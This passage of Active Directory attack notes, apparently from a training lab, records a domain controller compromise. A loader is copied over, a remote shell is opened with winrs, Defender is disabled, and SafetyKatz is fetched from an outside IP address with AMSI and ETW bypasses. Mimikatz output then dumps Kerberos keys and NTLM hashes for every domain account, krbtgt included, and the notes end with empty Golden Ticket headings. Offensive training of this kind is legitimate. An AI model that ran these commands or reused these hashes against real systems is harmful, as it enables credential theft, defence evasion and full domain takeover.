         * Password : bd d5 15 ad 8e 0f 22 ae 78 ff a6 56 d8 11 04 52 c0 f5 c0 6d 2c c1 ab 97 a4 9f c9 00 50 4c 85 f7 22 e1 8a 1e 81 88 db 9a cb 42 e7 ec 37 fe e1 da 96 d5 0e 3a b2 e5 f0 3d 80 4a 4e 51 5c fd 11 f5 aa cd 3a c0 b9 be 6e ee 83 e0 79 75 25 39 a2 14 97 9c f3 dc 16 7f 7e 90 a1 3a 30 1e 37 87 50 3b e7 10 4a d7 d8 6f 51 e5 42 7c fa b6 07 ae c1 05 ff 77 23 c9 1f c7 65 24 96 f4 eb 68 f5 b6 72 f2 36 8e 82 95 91 c5 bb 57 10 76 f3 16 f5 0d 8e c5 be b1 7f e6 d2 f0 25 38 0d 28 14 ae 1a fb bd cd 2f a9 5a 1b 53 2e ea 92 2f 3b 22 2d 44 eb 29 a3 bc 2f f3 6b c6 3b 80 36 82 cf 37 4b 6f 3b aa 3b f9 6c 9b b3 88 57 af bf af b4 e7 26 17 2b a7 8b ca eb 29 e1 74 8e 8d 71 53 53 a6 f1 67 46 84 e9 58 14 d0 ca 1c df 78 4c a9 95 db c2 d1 75 0f 02
         * Key List :
           aes256_hmac       2a1e526dbb56ff91c62528d11d182f42ed6017a1af57a5daf01d2052c9da7a0a
           aes128_hmac       417204a7aa308dc8096f57b27026ce87
           rc4_hmac_nt       9407a301944bf60d059322952f56718a
           rc4_hmac_old      9407a301944bf60d059322952f56718a
           rc4_md4           9407a301944bf60d059322952f56718a
           rc4_hmac_nt_exp   9407a301944bf60d059322952f56718a
           rc4_hmac_old_exp  9407a301944bf60d059322952f56718a

Authentication Id : 0 ; 26505 (00000000:00006789)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:50:57 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-DC$
         * Domain   : dollarcorp.moneycorp.local
         * Password : bd d5 15 ad 8e 0f 22 ae 78 ff a6 56 d8 11 04 52 c0 f5 c0 6d 2c c1 ab 97 a4 9f c9 00 50 4c 85 f7 22 e1 8a 1e 81 88 db 9a cb 42 e7 ec 37 fe e1 da 96 d5 0e 3a b2 e5 f0 3d 80 4a 4e 51 5c fd 11 f5 aa cd 3a c0 b9 be 6e ee 83 e0 79 75 25 39 a2 14 97 9c f3 dc 16 7f 7e 90 a1 3a 30 1e 37 87 50 3b e7 10 4a d7 d8 6f 51 e5 42 7c fa b6 07 ae c1 05 ff 77 23 c9 1f c7 65 24 96 f4 eb 68 f5 b6 72 f2 36 8e 82 95 91 c5 bb 57 10 76 f3 16 f5 0d 8e c5 be b1 7f e6 d2 f0 25 38 0d 28 14 ae 1a fb bd cd 2f a9 5a 1b 53 2e ea 92 2f 3b 22 2d 44 eb 29 a3 bc 2f f3 6b c6 3b 80 36 82 cf 37 4b 6f 3b aa 3b f9 6c 9b b3 88 57 af bf af b4 e7 26 17 2b a7 8b ca eb 29 e1 74 8e 8d 71 53 53 a6 f1 67 46 84 e9 58 14 d0 ca 1c df 78 4c a9 95 db c2 d1 75 0f 02
         * Key List :
           aes256_hmac       2a1e526dbb56ff91c62528d11d182f42ed6017a1af57a5daf01d2052c9da7a0a
           aes128_hmac       417204a7aa308dc8096f57b27026ce87
           rc4_hmac_nt       9407a301944bf60d059322952f56718a
           rc4_hmac_old      9407a301944bf60d059322952f56718a
           rc4_md4           9407a301944bf60d059322952f56718a
           rc4_hmac_nt_exp   9407a301944bf60d059322952f56718a
           rc4_hmac_old_exp  9407a301944bf60d059322952f56718a

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-DC$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 3/28/2023 3:50:55 AM
SID               : S-1-5-18

         * Username : dcorp-dc$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e31b09b77c710924a116018b6513d6ed9938b86b0ae810c63b65965cf5a5afcc
           rc4_hmac_nt       9407a301944bf60d059322952f56718a
           rc4_hmac_old      9407a301944bf60d059322952f56718a
           rc4_md4           9407a301944bf60d059322952f56718a
           rc4_hmac_nt_exp   9407a301944bf60d059322952f56718a
           rc4_hmac_old_exp  9407a301944bf60d059322952f56718a

```

lsadump:lsa /patch (L)

```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\ /Y
C:\AD\Tools\Loader.exe
1 File(s) copied

C:\Windows\system32>winrs -r:dcorp-dc cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\svcadmin>powershell -c Set-MpPreference -DisableRealTimeMonitoring $true
powershell -c Set-MpPreference -DisableRealTimeMonitoring $true

C:\Users\svcadmin>C:\Users\Public\Loader.exe -path http://172.16.100.162/SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://172.16.100.162/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://172.16.100.162/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # http://172.16.100.162/SafetyKatz.exe
ERROR mimikatz_doLocal ; "http://172.16.100.162/SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : dcorp / S-1-5-21-719815819-3726368948-3917688648

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 4e9815869d2090ccfca61c1fe0d23986

RID  : 00000459 (1113)
User : sqladmin
LM   :
NTLM : 07e8be316e3da9a042a9cb681df19bf5

RID  : 0000045a (1114)
User : websvc
LM   :
NTLM : cc098f204c5887eaa8253e7c2749156f

RID  : 0000045b (1115)
User : srvadmin
LM   :
NTLM : a98e18228819e8eec3dfa33cb68b0728

RID  : 0000045d (1117)
User : appadmin
LM   :
NTLM : d549831a955fee51a43c83efb3928fa7

RID  : 0000045e (1118)
User : svcadmin
LM   :
NTLM : b38ff50264b74508085d82c69794a4d8

RID  : 0000045f (1119)
User : testda
LM   :
NTLM : a16452f790729fa34e8f3a08f234a82c

RID  : 00000460 (1120)
User : mgmtadmin
LM   :
NTLM : 95e2cd7ff77379e34c6e46265e75d754

RID  : 00000461 (1121)
User : ciadmin
LM   :
NTLM : e08253add90dccf1a208523d02998c3d

RID  : 00000462 (1122)
User : sql1admin
LM   :
NTLM : e999ae4bd06932620a1e78d2112138c6

RID  : 00001055 (4181)
User : studentadmin
LM   :
NTLM : d1254f303421d3cdbdc4c73a5bce0201

RID  : 000013ed (5101)
User : student161
LM   :
NTLM : ede0849d4a96cd9132b6da4417f18a1c

RID  : 000013ee (5102)
User : student162
LM   :
NTLM : 48d86b3d18d2279bf27322b52927e21f

RID  : 000013ef (5103)
User : student163
LM   :
NTLM : 52d36564c78fb52dfcd835fca8721cda

RID  : 000013f0 (5104)
User : student164
LM   :
NTLM : ff0058050b1abe623f1cf31b48ef3403

RID  : 000013f1 (5105)
User : student165
LM   :
NTLM : d3a98e72bb3159d15f504da749dd8122

RID  : 000013f2 (5106)
User : student166
LM   :
NTLM : ab9803acaaf3496282494f6fec11ceaa

RID  : 000013f3 (5107)
User : student167
LM   :
NTLM : 3a6ea7599e836ff79d882231dceebb47

RID  : 000013f4 (5108)
User : student168
LM   :
NTLM : 9603766d55ce7effb93d276850c699f3

RID  : 000013f5 (5109)
User : student169
LM   :
NTLM : f5327861ac5d757fa0266f1657731741

RID  : 000013f6 (5110)
User : student170
LM   :
NTLM : 46c1a093cbd75a685aefca299fadb375

RID  : 000013f7 (5111)
User : student171
LM   :
NTLM : 4f10e139b0a2d81978bc16b8f80b11a7

RID  : 000013f8 (5112)
User : student172
LM   :
NTLM : 2c6278c55abefdfb0951db27ec27132d

RID  : 000013f9 (5113)
User : student173
LM   :
NTLM : 8bd7c1c0cf3196d8c20766bd61cca72c

RID  : 000013fa (5114)
User : student174
LM   :
NTLM : 44bbd3f7de71ee8fc531e45b21c384ee

RID  : 000013fb (5115)
User : student175
LM   :
NTLM : 3ca8403bb521b2f21eda1d90ed8437d3

RID  : 000013fc (5116)
User : student176
LM   :
NTLM : 747f4bb56fe47910ac3ee0a280f287da

RID  : 000013fd (5117)
User : student177
LM   :
NTLM : bdd301790bdc959ca66bf72fc73e5130

RID  : 000013fe (5118)
User : student178
LM   :
NTLM : e426ddc72eb1098fa76324c53dcbc02b

RID  : 000013ff (5119)
User : student179
LM   :
NTLM : 69e4c32666ddc49586892d94295a5cdc

RID  : 00001400 (5120)
User : student180
LM   :
NTLM : fdc0b4eb1a53087a97da6de3e55154e3

RID  : 00001401 (5121)
User : Control161user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001402 (5122)
User : Control162user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001403 (5123)
User : Control163user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001404 (5124)
User : Control164user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001405 (5125)
User : Control165user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001406 (5126)
User : Control166user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001407 (5127)
User : Control167user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001408 (5128)
User : Control168user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001409 (5129)
User : Control169user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 0000140a (5130)
User : Control170user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 0000140b (5131)
User : Control171user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 0000140c (5132)
User : Control172user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 0000140d (5133)
User : Control173user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 0000140e (5134)
User : Control174user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 0000140f (5135)
User : Control175user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001410 (5136)
User : Control176user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001411 (5137)
User : Control177user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001412 (5138)
User : Control178user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001413 (5139)
User : Control179user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001414 (5140)
User : Control180user
LM   :
NTLM : c8aed8673aca42f9a83ff8d2c84860f0

RID  : 00001415 (5141)
User : Support161user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001416 (5142)
User : Support162user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001417 (5143)
User : Support163user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001418 (5144)
User : Support164user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001419 (5145)
User : Support165user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 0000141a (5146)
User : Support166user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 0000141b (5147)
User : Support167user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 0000141c (5148)
User : Support168user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 0000141d (5149)
User : Support169user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 0000141e (5150)
User : Support170user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 0000141f (5151)
User : Support171user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001420 (5152)
User : Support172user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001421 (5153)
User : Support173user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001422 (5154)
User : Support174user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001423 (5155)
User : Support175user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001424 (5156)
User : Support176user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001425 (5157)
User : Support177user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001426 (5158)
User : Support178user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001427 (5159)
User : Support179user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001428 (5160)
User : Support180user
LM   :
NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7

RID  : 00001429 (5161)
User : VPN161user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000142a (5162)
User : VPN162user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000142b (5163)
User : VPN163user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000142c (5164)
User : VPN164user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000142d (5165)
User : VPN165user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000142e (5166)
User : VPN166user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000142f (5167)
User : VPN167user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001430 (5168)
User : VPN168user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001431 (5169)
User : VPN169user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001432 (5170)
User : VPN170user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001433 (5171)
User : VPN171user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001434 (5172)
User : VPN172user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001435 (5173)
User : VPN173user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001436 (5174)
User : VPN174user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001437 (5175)
User : VPN175user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001438 (5176)
User : VPN176user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 00001439 (5177)
User : VPN177user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000143a (5178)
User : VPN178user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000143b (5179)
User : VPN179user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 0000143c (5180)
User : VPN180user
LM   :
NTLM : bb1d7a9ac6d4f535e1986ddbc5428881

RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 9407a301944bf60d059322952f56718a

RID  : 00000451 (1105)
User : DCORP-ADMINSRV$
LM   :
NTLM : b5f451985fd34d58d5120816d31b5565

RID  : 00000452 (1106)
User : DCORP-APPSRV$
LM   :
NTLM : b4cb7bf8b93c78b8051c7906bb054dc5

RID  : 00000453 (1107)
User : DCORP-CI$
LM   :
NTLM : f76f48c176dc09cfd5765843c32809f3

RID  : 00000454 (1108)
User : DCORP-MGMT$
LM   :
NTLM : 0878da540f45b31b974f73312c18e754

RID  : 00000455 (1109)
User : DCORP-MSSQL$
LM   :
NTLM : b205f1ca05bedace801893d6aa5aca27

RID  : 00000456 (1110)
User : DCORP-SQL1$
LM   :
NTLM : 3686dfb420dc0f9635e70c6ca5875b49

RID  : 0000106a (4202)
User : DCORP-STDADMIN$
LM   :
NTLM : 0ac79d856828c9f40da11c554cb05980

RID  : 0000143d (5181)
User : DCORP-STD161$
LM   :
NTLM : 7c6377566cbe97d1a5fbb55fa947ae14

RID  : 0000143e (5182)
User : DCORP-STD162$
LM   :
NTLM : 482cac07dff3ba25847df57dc9a04e55

RID  : 0000143f (5183)
User : DCORP-STD163$
LM   :
NTLM : af998f7b01db6e5535caf44e1d427668

RID  : 00001440 (5184)
User : DCORP-STD164$
LM   :
NTLM : d04ec5a2bbdbe63d75d2d3b97dc8dc77

RID  : 00001441 (5185)
User : DCORP-STD165$
LM   :
NTLM : b07d6d69dee7d98c40c5f1fc646edb00

RID  : 00001442 (5186)
User : DCORP-STD166$
LM   :
NTLM : f21ef5431b0555432a1763c4bc98676e

RID  : 00001443 (5187)
User : DCORP-STD167$
LM   :
NTLM : 5523ec2de0e900be27e9d21e05a192f7

RID  : 00001444 (5188)
User : DCORP-STD168$
LM   :
NTLM : fd93f9baf21f657fb250c67b539c1816

RID  : 00001445 (5189)
User : DCORP-STD169$
LM   :
NTLM : 4c34ec6ec1f9b51b50aaefc261ef1b9f

RID  : 00001446 (5190)
User : DCORP-STD170$
LM   :
NTLM : 1d505b787db4112a617f27db73a201e6

RID  : 00001447 (5191)
User : DCORP-STD171$
LM   :
NTLM : 451e26b820c360957bb1fe9b130374e2

RID  : 00001448 (5192)
User : DCORP-STD172$
LM   :
NTLM : bdb019f02f235e00d33ec3310b088366

RID  : 00001449 (5193)
User : DCORP-STD173$
LM   :
NTLM : d8fdcc103bc1cebe521a956065c4e3ff

RID  : 0000144a (5194)
User : DCORP-STD174$
LM   :
NTLM : e8640db26779b62a48011a29f62e4b2c

RID  : 0000144b (5195)
User : DCORP-STD175$
LM   :
NTLM : 87f8c150a8bd642e067efb314d0958a6

RID  : 0000144c (5196)
User : DCORP-STD176$
LM   :
NTLM : cf0c242aae64f27af30234f1b64fcfec

RID  : 0000144d (5197)
User : DCORP-STD177$
LM   :
NTLM : d4c05f71b7e4dd2e9b6368b22de638be

RID  : 0000144e (5198)
User : DCORP-STD178$
LM   :
NTLM : ee19c2409a469408859cf279a1ed1f6b

RID  : 0000144f (5199)
User : DCORP-STD179$
LM   :
NTLM : a667e18f5ae1ac8d0d9fd8578a0b3aa7

RID  : 00001450 (5200)
User : DCORP-STD180$
LM   :
NTLM : e4a14b3d58870ac4349c47f05a76d358

RID  : 0000044f (1103)
User : mcorp$
LM   :
NTLM : 0540fcf09a1a1df82ce6f59275737b85

RID  : 00000450 (1104)
User : US$
LM   :
NTLM : 2f456c8407d20b73a7a56ab955cce108

RID  : 00000458 (1112)
User : ecorp$
LM   :
NTLM : 9b2544e351c72905e0e7c4583e255bd1

```
## Using Secrets for Golden Ticket

```
```

## Golden Ticket DA privileges

```
```

